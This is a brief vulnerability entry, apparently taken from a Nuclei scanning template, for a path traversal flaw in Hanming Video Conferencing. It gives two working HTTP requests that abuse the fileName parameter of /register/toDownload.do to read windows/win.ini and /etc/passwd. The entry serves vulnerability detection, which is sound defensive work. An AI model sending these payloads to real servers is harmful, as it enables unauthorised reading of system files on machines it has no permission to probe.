# Vulnerability: Hanming Video Conferencing - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`hanming-lfr.yaml`)

## Description
Hanming Video Conferencing is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
GET {{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd
```

